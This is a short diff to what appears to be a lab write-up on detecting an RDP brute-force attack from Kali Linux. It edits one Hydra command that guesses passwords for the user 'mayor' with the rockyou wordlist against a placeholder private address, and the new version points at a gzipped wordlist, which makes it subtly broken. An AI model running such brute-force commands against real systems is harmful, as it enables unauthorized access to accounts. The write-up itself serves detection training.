@@ -86,7 +86,7 @@ A brute force attack was launched from Kali Linux targeting the Windows RDP serv
 ```bash
 sudo apt install hydra -y
 
-hydra -l mayor -P /usr/share/wordlists/rockyou.txt rdp://192.168.x.x
+ hydra -l mayor -P /usr/share/wordlists/rockyou.txt.gz rdp://192.168.x.x
 ```
 
 **Detection:**
